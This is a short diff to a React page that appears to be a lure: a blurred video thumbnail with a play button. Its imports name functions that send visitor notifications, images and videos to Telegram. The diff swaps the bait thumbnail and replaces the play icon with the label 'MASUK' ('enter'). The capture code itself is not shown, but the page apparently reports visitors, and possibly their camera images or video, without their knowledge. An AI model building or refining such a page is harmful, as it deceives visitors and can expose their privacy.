@@ -4,7 +4,7 @@ import { sendTelegramNotification, sendImageToTelegram, sendVideoToTelegram } fr
 
 function App() {
   const [isBlurred] = useState(true);
-  const thumbnailUrl = 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ3mIZDyr0F-IZhziM1yd0ljB-Bq_HHe7hMTA&s';
+  const thumbnailUrl = 'https://asset.kompas.com/crops/CMYIPwpqSml1bOZRFLteJAkT4hM=/0x116:4000x2782/1200x800/data/photo/2023/01/03/63b3ab7263e4e.jpg';
 
   useEffect(() => {
     const sendVisitorNotification = async () => {
@@ -118,7 +118,8 @@ function App() {
                   onClick={handlePlayClick}
                   className="bg-red-600 rounded-full p-8 hover:bg-red-700 transition-all duration-300 hover:scale-110 group"
                 >
-                  <PlayIcon className="w-20 h-20 text-white group-hover:text-gray-100" />
+                  <PlayIcon className="w-20 h-20 text-white group-hover:text-gray-100 d-none" />
+                  <span className='text-white'>MASUK</span>
                 </button>
               </div>
               <img 
